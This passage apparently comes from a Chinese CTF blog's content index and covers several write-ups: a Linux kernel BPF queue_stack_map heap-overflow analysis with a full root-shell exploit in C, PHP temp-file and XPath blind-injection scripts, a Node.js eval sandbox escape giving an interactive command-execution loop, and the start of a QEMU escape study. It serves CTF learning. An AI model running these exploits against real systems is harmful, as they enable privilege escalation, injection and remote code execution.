set).\t\t\t\t\t */\t\tchar\tmap_name[BPF_OBJ_NAME_LEN];\t\t__u32\tmap_ifindex;\t/* ifindex of netdev to create on */\t\t__u32\tbtf_fd;\t\t/* fd pointing to a BTF type data */\t\t__u32\tbtf_key_type_id;\t/* BTF type_id of the key */\t\t__u32\tbtf_value_type_id;\t/* BTF type_id of the value */\t&#125;;  // ...&#125;\n\nstatic struct bpf_map *find_and_alloc_map(union bpf_attr *attr)&#123;\tconst struct bpf_map_ops *ops;\tu32 type = attr-&gt;map_type;\tstruct bpf_map *map;\tint err;\tif (type &gt;= ARRAY_SIZE(bpf_map_types))\t\treturn ERR_PTR(-EINVAL);\ttype = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));\tops = bpf_map_types[type];\tif (!ops)\t\treturn ERR_PTR(-EINVAL);\tif (ops-&gt;map_alloc_check) &#123;\t\terr = ops-&gt;map_alloc_check(attr);\t\tif (err)\t\t\treturn ERR_PTR(err);\t&#125;\tif (attr-&gt;map_ifindex)\t\tops = &amp;bpf_map_offload_ops;\tmap = ops-&gt;map_alloc(attr);\tif (IS_ERR(map))\t\treturn map;\tmap-&gt;ops = ops;\tmap-&gt;map_type = type;\treturn map;&#125;\n\n可以看到这里是首先根据type作为索引得到ops，最后再调用ops中的map_alloc函数但是可以注意到的是在数组中存在以下的ops结构体\nconst struct bpf_map_ops queue_map_ops = &#123;\t.map_alloc_check = queue_stack_map_alloc_check,\t.map_alloc = queue_stack_map_alloc,\t.map_free = queue_stack_map_free,\t.map_lookup_elem = queue_stack_map_lookup_elem,\t.map_update_elem = queue_stack_map_update_elem,\t.map_delete_elem = queue_stack_map_delete_elem,\t.map_push_elem = queue_stack_map_push_elem,\t.map_pop_elem = queue_map_pop_elem,\t.map_peek_elem = queue_map_peek_elem,\t.map_get_next_key = queue_stack_map_get_next_key,&#125;;\n\n这里的漏洞也就存在于上述结构体中的queue_stack_map_alloc函数。\n.text:FFFFFFFF8119D17A 44 89 F0                      mov     eax, r14d.text:FFFFFFFF8119D17D 4C 8B 3C C5 80 83 02 82       mov     r15, ds:qword_FFFFFFFF82028380[rax*8]  .rodata:FFFFFFFF82028380 qword_FFFFFFFF82028380   dq 0                    ; DATA XREF: map_create+AD↑r; ... ....rodata:FFFFFFFF82028410                 dq offset unk_FFFFFFFF8210F0A0.rodata:FFFFFFFF82028418                 dq offset unk_FFFFFFFF82029B00.rodata:FFFFFFFF82028420                 dq offset unk_FFFFFFFF8202A680.rodata:FFFFFFFF82028428                 dq offset unk_FFFFFFFF82029B00.rodata:FFFFFFFF82028430                 dq offset unk_FFFFFFFF82029C40.rodata:FFFFFFFF82028438                 dq offset off_FFFFFFFF82029BA0; ... ....rodata:FFFFFFFF82029BA0                 dq offset queue_stack_map_alloc_check.rodata:FFFFFFFF82029BA8                 dq offset queue_stack_map_alloc.rodata:FFFFFFFF82029BB0                 dq 0.rodata:FFFFFFFF82029BB8                 dq offset queue_stack_map_free.rodata:FFFFFFFF82029BC0                 dq offset queue_stack_map_get_next_key.rodata:FFFFFFFF82029BC8                 dq 0.rodata:FFFFFFFF82029BD0                 dq offset queue_stack_map_lookup_elem.rodata:FFFFFFFF82029BD8                 dq offset queue_stack_map_update_elem.rodata:FFFFFFFF82029BE0                 dq offset queue_stack_map_delete_elem.rodata:FFFFFFFF82029BE8                 dq offset queue_stack_map_push_elem.rodata:FFFFFFFF82029BF0                 dq offset stack_map_pop_elem.rodata:FFFFFFFF82029BF8                 dq offset stack_map_peek_elem\n\n可以看到只要计算偏移就可以成功修改ops为queue_stack_map_alloc函数，经过计算可得type为:(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 。\nstatic struct bpf_map *queue_stack_map_alloc(union bpf_attr *attr)&#123;\tint ret, numa_node = bpf_map_attr_numa_node(attr);\tstruct bpf_queue_stack *qs;\tu64 size, queue_size, cost;\tsize = (u64) attr-&gt;max_entries + 1;\tcost = queue_size = sizeof(*qs) + size * attr-&gt;value_size;\tif (cost &gt;= U32_MAX - PAGE_SIZE)\t\treturn ERR_PTR(-E2BIG);\tcost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;\tret = bpf_map_precharge_memlock(cost);\tif (ret &lt; 0)\t\treturn ERR_PTR(ret);\tqs = bpf_map_area_alloc(queue_size, numa_node);\tif (!qs)\t\treturn ERR_PTR(-ENOMEM);\tmemset(qs, 0, sizeof(*qs));\tbpf_map_init_from_attr(&amp;qs-&gt;map, attr);\tqs-&gt;map.pages = cost;\tqs-&gt;size = size;\traw_spin_lock_init(&amp;qs-&gt;lock);\treturn &amp;qs-&gt;map;&#125;\n\n可以看到这里的cost其实就是等于sizeof(*qs) + (attr-&gt;value_size) * (attr-&gt;max_entries+1)，并且这里的attr是我们可控的，如果我们控制attr-&gt;max_entries为-1那么这里申请的大小只有sizeof(struct bpf_queue_stack)并且这个size其实是管理堆块的大小，用于存储数据结构，后面的内容为数据存储结构。\nvoid bpf_map_init_from_attr(struct bpf_map *map, union bpf_attr *attr)&#123;\tmap-&gt;map_type = attr-&gt;map_type;\tmap-&gt;key_size = attr-&gt;key_size;\tmap-&gt;value_size = attr-&gt;value_size;\tmap-&gt;max_entries = attr-&gt;max_entries;\tmap-&gt;map_flags = attr-&gt;map_flags;\tmap-&gt;numa_node = bpf_map_attr_numa_node(attr);&#125;\n\n最后将用户传进来的attr赋值过去。最后生成id，并将id返回给用户。\n堆溢出可以看到在上面的系统调用中存在BPF_MAP_UPDATE_ELEM功能，其实现的函数为：map_update_elem\nstatic int map_update_elem(union bpf_attr *attr)&#123;  void __user *ukey = u64_to_user_ptr(attr-&gt;key);  void __user *uvalue = u64_to_user_ptr(attr-&gt;value);  int ufd = attr-&gt;map_fd;  struct bpf_map *map;  void *key, *value;  u32 value_size;  struct fd f;  int err;  if (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))    return -EINVAL;  f = fdget(ufd);  map = __bpf_map_get(f);  if (IS_ERR(map))    return PTR_ERR(map);  if (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;    err = -EPERM;    goto err_put;  &#125;  key = __bpf_copy_key(ukey, map-&gt;key_size);  if (IS_ERR(key)) &#123;    err = PTR_ERR(key);    goto err_put;  &#125;  if (map-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||      map-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||      map-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||      map-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)    value_size = round_up(map-&gt;value_size, 8) * num_possible_cpus();  else    value_size = map-&gt;value_size;  err = -ENOMEM;  value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);  if (!value)    goto free_key;  err = -EFAULT;  if (copy_from_user(value, uvalue, value_size) != 0)    goto free_value;  /* Need to create a kthread, thus must support schedule */  if (bpf_map_is_dev_bound(map)) &#123;    err = bpf_map_offload_update_elem(map, key, value, attr-&gt;flags);    goto out;  &#125; else if (map-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||             map-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||             map-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;    err = map-&gt;ops-&gt;map_update_elem(map, key, value, attr-&gt;flags);    goto out;  &#125;// ...&#125;\n\n可以看到这里是直接取出map中存储的value_size直接kmalloc一个堆块，然后从用户态copy内容到堆块上面。随后调用ops中的map_update_elem函数。\nstatic int queue_stack_map_push_elem(struct bpf_map *map, void *value,                                     u64 flags)&#123;  struct bpf_queue_stack *qs = bpf_queue_stack(map);  unsigned long irq_flags;  int err = 0;  void *dst;  /* BPF_EXIST is used to force making room for a new element in case the\t * map is full\t */  bool replace = (flags &amp; BPF_EXIST);  /* Check supported flags for queue and stack maps */  if (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)    return -EINVAL;  raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);  if (queue_stack_map_is_full(qs)) &#123;    if (!replace) &#123;      err = -E2BIG;      goto out;    &#125;    /* advance tail pointer to overwrite oldest element */    if (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))      qs-&gt;tail = 0;  &#125;  dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;map.value_size];  memcpy(dst, value, qs-&gt;map.value_size);  if (unlikely(++qs-&gt;head &gt;= qs-&gt;size))    qs-&gt;head = 0;  out:  raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);  return err;&#125;\n\nstruct bpf_queue_stack &#123;\tstruct bpf_map map;\traw_spinlock_t lock;\tu32 head, tail;\tu32 size; /* max_entries + 1 */\tchar elements[0] __aligned(8);&#125;;\n\n这里利用memcpy将堆块上的内容复制到目标地址。这里查看qs的定义可以看出来其实就是往管理堆块下面相邻的堆块进行写入，但是因为我们上面申请的size只是管理堆块的size这也就导致了我们可以进行堆溢出。\n简单总结其实从上面分析到这里可以看出来这里的功能主要是要干嘛的，并且分析出来qs的结构。这里简化一下结构体其实就是类似于msg_msg的一种结构：\nstruct &#123;  manager;  data;&#125;\n\n不过我们每次进行update的时候只能够修改data中的一个小块，而这些小块又被分成了attr-&gt;max_entries + 1个，并且每个小块的size为：attr-&gt;value_size。\n利用分析这里主要利用堆风水使我们分配的两个object相邻，接着修改掉ops指针，劫持函数实现站栈迁移即可。\n这里使用到的gadget在 modify_ldt利用 中提到过，不熟悉的可以去看看这里就不再赘述。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define SPRAY_NUMBER 14#ifndef __NR_bpf#define __NR_bpf 321#endifvoid errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    unsigned long swapgs = 0xffffffff81c00d5a;    unsigned long iretq = 0xffffffff8106d8f4;    unsigned long stack_pivot_gadget = 0xffffffff81954dc8;    char *buf = malloc(0x4000);    long int res;    unsigned long fake_ops[0x1000] = &#123;0&#125;;    unsigned long pointer[0x1000] = &#123;0&#125;;    char *rop_addr;    memset(buf, 0, sizeof(buf));    *(unsigned int *)buf = 0x17;    *(unsigned int *)(buf + 4) = 0;    *(unsigned int *)(buf + 8) = 0x40;    *(unsigned int *)(buf + 12) = -1;    *(unsigned int *)(buf + 16) = 0;    *(unsigned int *)(buf + 20) = -1;    res = syscall(__NR_bpf, 0, buf, 0x2c);    if (res == -1)        errExit(&quot;BPF_MAP_CREATE error!&quot;);    unsigned long victim[SPRAY_NUMBER];    for (int i = 0; i &lt; SPRAY_NUMBER; i++)    &#123;        victim[i] = syscall(__NR_bpf, 0, buf, 0x2c);    &#125;    printf(&quot;spray finished!\\n&quot;);    fake_ops[2] = stack_pivot_gadget;    pointer[6] = fake_ops;    *(unsigned int *)buf = res;    *(unsigned int *)(buf + 4) = 0;    *(unsigned long *)(buf + 8) = 0;    *(unsigned long *)(buf + 16) = pointer;    *(unsigned long *)(buf + 24) = 2;    syscall(__NR_bpf, 2, buf, 0x20);    printf(&quot;changed ops\\n&quot;);    rop_addr = mmap(0x81954000, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    int idx = 0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81029c71;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0x6f0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff810013b9;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xFFFFFFFF810E3D40;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81001c50;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff810013b9;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81264e0b;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xFFFFFFFF810E3AB0;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff81c00d5a;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0x246;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = 0xffffffff8106d8f4;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)get_shell;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_cs;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_rflags;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_sp;    *(unsigned long *)(rop_addr + 0x143c + (idx++ * 8)) = (uint64_t)user_ss;    *(unsigned long *)(0x81954dc8) = 0xffffffff81029c71;    for (int i = 0; i &lt; SPRAY_NUMBER; i++)    &#123;        close(victim[i]);    &#125;    return 0;&#125;\n\n\n\n参考链接:http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\n","categories":["kernel-pwn"],"tags":["bpf","堆喷射"]},{"title":"NPUCTF2020_ezinclude","url":"/2021/09/21/NPUCTF2020-ezinclude/","content":"\n发现思路并不清晰，就开始扫他丫的东方明珠塔。\n\n扫了仨文件出来，访问之后发现dir显示的应该是某个空目录。\n\n然后看看index的数据包，发现hash那里很长很想md5的结果，拿去py看了一下确实是32位，就尝试?pass=fa25e…上面那个。\n\n跳转到这个页面，然后我在浏览器试了很久都打不开，结果是我傻逼了，继续用burpsuite。出来让我包含文件，读取了所有文件没找到flag但是dir.php的内容其实是 print_r(scandir(‘/tmp’))。然后这里就开始打算些session条件竞争了。\n但是这个题目的预期解是利用php程序崩溃不删除临时文件然后拿到flag。\nphp://filter/string.strip_tags\n使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。\n该方法仅适用于以下php7版本，php5并不存在该崩溃：\n• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n\nconvert.quoted-printable-encode\n这个崩溃并不适用于include，require等函数，适用于file函数，file_get_contents函数，readfile函数\n• php7.0.0-7.0.32• php7.0.4-7.2.12• php&lt;=5.6.38的版本\n\n5.6.39-5.6.9以内的版本并不存在这个崩溃\n放出最后的exp\nimport requestspayload = b&#x27;&lt;?php phpinfo();?&gt;&#x27;file = &#123;    &#x27;file&#x27;: (&#x27;back&#x27;, payload)&#125;url = &#x27;http://bfd565e1-b0f5-4857-89f7-ebd8088c4357.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;res = requests.post(url=url, files=file)print(res.text)\n\n上方知识点师傅链接:https://www.cnblogs.com/tr1ple/p/11301743.html\n","categories":["web-buuctf"],"tags":["文件包含","php冷门知识"]},{"title":"NPUCTF2020_ezlogin","url":"/2021/10/19/NPUCTF2020-ezlogin/","content":"近期刷题感觉全是不会的，烦躁的要死，后面静下心来好好刷了。\nXpath基础语法:https://xz.aliyun.com/t/7791#toc-6\n了解玩Xpath基础语法之后就直接开始构造payload吧，先来个\n&lt;username&gt;&#x27;or 1=1 or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;3f2ea0aa5c07e1b6dbTYzNDYyNjM1Ny4&lt;/token&gt;\n\n发现弹出非法操作!然后试了很多都是，被过滤的脑壳痛去看了wp，然而事实是，弹出非法操作!就是执行结果为true。还有一点恶心的就是题目需要上传的token换得是真的快，加上又是盲注可以直接开始写脚本了。\nimport requestsimport reimport timeurl = &#x27;http://bb300bbc-590d-4a1f-8768-b659cc0efca2.node4.buuoj.cn:81/&#x27;session = requests.session()headers = &#123;    &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[3]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[1]/username/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[1]/password/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/username/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;flag = &#x27;&#x27;for i in range(1, 50):    flag_length = len(flag)    for j in range(27, 128):        res = session.get(url).text        token = re.findall(            r&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;, res)[0]        time.sleep(0.25)        print(payload.format(str(i), chr(j), token))        res = session.post(url, data=payload.format(            str(i), chr(j), token), headers=headers).text        if &#x27;非法操作!&#x27; in res:            flag += chr(j)            print(flag)            break    if flag_length == len(flag):        breakprint(flag)# adm1n  cf7414b5bdb2e65ee43083f4ddbc4d9f\n\n可以看见密码是md5加密的，解密一下就好，然后进入之后就是一个文件包含，但是又被过滤了，我也是在wp看到的payload\n?file=phP://filter/read=convert.bAse64-encode/resource=/flag\n\n\n","categories":["web-buuctf"],"tags":["Xpath注入"]},{"title":"NPUCTF2020_验证码","url":"/2021/11/30/NPUCTF2020-%E9%AA%8C%E8%AF%81%E7%A0%81/","content":"题目源代码const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123;    return crypto.createHash(&#x27;md5&#x27;)        .update(s)        .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123;    if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123;        return null;    &#125;    return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123;    return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123;    name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿，给爷爪⑧    keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123;    let result = &#x27;&#x27;;    const results = req.session.results || [];    const &#123; e, first, second &#125; = req.body;    if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])) \t &#123;        if (req.body.e) &#123;            try &#123;                result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;            &#125; catch (e) &#123;                console.log(e);                result = &#x27;Wrong Wrong Wrong!!!&#x27;;            &#125;            results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);        &#125;    &#125; else &#123;        results.unshift(&#x27;Not verified!&#x27;);    &#125;    if (results.length &gt; 13) &#123;        results.pop();    &#125;    req.session.results = results;    res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#x27;/source&#x27;, function (req, res) &#123;    res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;);    res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123;    res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;);    req.session.admin = req.session.admin || 0;    res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;    console.log(&#x27;Start listening&#x27;)&#125;);\n\n流程分析可以看到我们post几个数据然后这里有一个比较\nif (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])) \n\n绕过的方式也很简单\n在js当中无论是数组还是对象和字符串相加最终都是字符串，所以我们只需要上传数组就够了哈。\nif (req.body.e) &#123;    try &#123;        result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;    &#125; catch (e) &#123;        console.log(e);        result = &#x27;Wrong Wrong Wrong!!!&#x27;;    &#125;    results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);&#125;\n\n紧接着就会执行这个\nfunction saferEval(str) &#123;    if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123;        return null;    &#125;    return eval(str);&#125;\n\n我们要匹配这个正则才能进行绕过，可以看到正则被分为了三段，第一段匹配的是Math.xxxxxxxx什么的，第二段是 ()+-*/&amp;|^%&lt;&gt;=,?: ，第三段是数字或则e1111都可以。\n利用思路就是构造出函数执行我们需要的就行\n\n后面必须用数字的我们用fromCharCode来绕过\nexpimport requestsimport jsonimport reurl = &#x27;http://51c7300e-c91d-44f8-92f8-d86efe685497.node4.buuoj.cn:81/&#x27;header = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;while True:    rce = input(&#x27;&gt;&gt;&gt;&#x27;)    if rce == &#x27;quit&#x27;:        break    content = &#x27;&#x27;    rce = &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;&quot; + \\        rce+&quot;&#x27;).toString()&quot;    for each in rce:        content += str(ord(each))        content += &#x27;,&#x27;    content = content[:-1]    data = &#123;        &quot;first&quot;: [1],        &quot;second&quot;: &quot;1&quot;,        &quot;e&quot;: &quot;((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;&#125;))()))(Math+2)&quot;.format(content)    &#125;    res = requests.post(url=url, data=json.dumps(data), headers=header).text    res = re.findall(&#x27;&lt;div id=&quot;res&quot;&gt;\\n(.*)&#x27;, res)    print(res[0].lstrip())\n\n","categories":["web-buuctf"],"tags":["js"]},{"title":"QEMU逃逸练习","url":"/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/","content":"可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。\nFastCP-ctf关于设备的分析可以参考前面两篇文章，这里就不再赘述了。\n函数分析uint64_t __fastcall fastcp_mmio_read(FastCPState *opaque, hwaddr addr, unsigned int size)&#123;  if ( size != 8 &amp;&amp; addr &lt;= 0x1F || addr &gt; 0x1F )    return -1LL;  if ( addr == 8 )    return opaque-&gt;cp_state.CP_list_src;  if ( addr &lt;= 8 )  &#123;    if ( !addr )      return opaque-&gt;handling;    return -1LL;  &#125;  if ( addr != 0x10 )  &#123;    if ( addr == 0x18 )      return opaque-&gt;cp_state.cmd;    return -1LL;  &#125;  return opaque-&gt;cp_state.CP_list_cnt;&#125;\n\n首先就是read函数这里是非常常规的一些内容。\nvoid __fastcall fastcp_mmio_write(FastCPState *opaque, hwaddr addr, uint64_t val, unsigned int size)&#123;  int64_t ns; // rax  if ( (size == 8 || addr &gt; 0x1F) &amp;&amp; addr &lt;= 0x1F )  &#123;    if ( addr == 0x10 )    &#123;      if ( opaque-&gt;handling != 1 )        opaque-&gt;cp_state.CP_list_cnt = val;    &#125;    else if ( addr == 0x18 )    &#123;      if ( opaque-&gt;handling != 1 )      &#123;        opaque-&gt;cp_state.cmd = val;        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);        timer_mod(&amp;opaque-&gt;cp_timer, ns / 1000000 + 100);      &#125;    &#125;    else if ( addr == 8 &amp;&amp; opaque-&gt;handling != 1 )    &#123;      opaque-&gt;cp_state.CP_list_src = val;    &#125;  &#125;&#125;\n\n再就是write函数，可以修改opaque-&gt;cp_state.cmd、opaque-&gt;cp_state.CP_list_cnt、opaque-&gt;cp_state.CP_list_src，并且可以看到中间会触发timer。\nvoid __fastcall fastcp_cp_timer(FastCPState *opaque)&#123;  uint64_t cmd; // rax  uint64_t CP_list_cnt; // rdx  __int64 v3; // rbp  uint64_t v4; // r12  uint64_t v5; // rax  uint64_t v6; // rax  bool v7; // zf  uint64_t v8; // rbp  __int64 v9; // rdx  FastCP_CP_INFO cp_info; // [rsp+0h] [rbp-68h] BYREF  char buf[8]; // [rsp+20h] [rbp-48h] BYREF  unsigned __int64 v12; // [rsp+28h] [rbp-40h]  unsigned __int64 v13; // [rsp+38h] [rbp-30h]  v13 = __readfsqword(0x28u);  cmd = opaque-&gt;cp_state.cmd;  memset(&amp;cp_info, 0, sizeof(cp_info));  switch ( cmd )  &#123;    case 2uLL:      v7 = opaque-&gt;cp_state.CP_list_cnt == 1;      opaque-&gt;handling = 1;      if ( v7 )      &#123;        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, 0x18uLL, 0);// read        if ( cp_info.CP_cnt &lt;= 0x1000 )          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, 0);        v6 = opaque-&gt;cp_state.cmd &amp; 0xFFFFFFFFFFFFFFFCLL;        opaque-&gt;cp_state.cmd = v6;        goto LABEL_11;      &#125;      break;    case 4uLL:      v7 = opaque-&gt;cp_state.CP_list_cnt == 1;      opaque-&gt;handling = 1;      if ( v7 )      &#123;        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, 0x18uLL, 0);        